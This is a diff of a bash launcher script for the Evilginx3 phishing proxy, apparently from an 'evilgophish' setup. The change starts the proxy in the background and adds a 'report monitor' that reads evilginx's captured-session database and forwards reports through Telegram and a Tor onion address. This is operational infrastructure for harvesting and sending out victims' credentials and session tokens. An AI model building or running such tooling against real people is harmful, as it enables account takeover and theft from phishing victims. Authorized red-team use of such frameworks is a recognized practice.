@@ -83,19 +83,41 @@ if [[ "$FEED_ENABLED" == *"true"* ]]; then
     EVILGINX_CMD="$EVILGINX_CMD -feed"
 fi
 
-# Add Telegram config if exists
-if [ -f "$TELEGRAM_CONFIG" ]; then
-    EVILGINX_CMD="$EVILGINX_CMD -telegram $TELEGRAM_CONFIG"
-fi
-
-# Add reports directory
-EVILGINX_CMD="$EVILGINX_CMD -reports $REPORTS_DIR"
-
 log "Running: $EVILGINX_CMD"
 nohup $EVILGINX_CMD > "$LOG_DIR/evilginx3_${TIMESTAMP}.log" 2>&1 &
 EVILGINX_PID=$!
 echo $EVILGINX_PID > "$SCRIPT_DIR/evilginx3.pid"
 log "Evilginx3 started with PID: $EVILGINX_PID"
+
+cd "$SCRIPT_DIR"
+
+# Wait for evilginx3 to initialize
+sleep 3
+
+# Start Report Monitor
+log "Starting Report Monitor..."
+cd "$SCRIPT_DIR/report_monitor"
+
+# Get the onion address if available
+ONION_ADDRESS=""
+if [ -f /var/lib/tor/evilgophish/hostname ]; then
+    ONION_ADDRESS=$(cat /var/lib/tor/evilgophish/hostname)
+fi
+
+# Build report monitor command
+MONITOR_CMD="./report_monitor -db $HOME/.evilginx/data.db -reports $REPORTS_DIR"
+if [ -f "$TELEGRAM_CONFIG" ]; then
+    MONITOR_CMD="$MONITOR_CMD -telegram $TELEGRAM_CONFIG"
+fi
+if [ ! -z "$ONION_ADDRESS" ]; then
+    MONITOR_CMD="$MONITOR_CMD -onion $ONION_ADDRESS"
+fi
+
+log "Running: $MONITOR_CMD"
+nohup $MONITOR_CMD > "$LOG_DIR/report_monitor_${TIMESTAMP}.log" 2>&1 &
+MONITOR_PID=$!
+echo $MONITOR_PID > "$SCRIPT_DIR/report_monitor.pid"
+log "Report Monitor started with PID: $MONITOR_PID"
 
 cd "$SCRIPT_DIR"
 
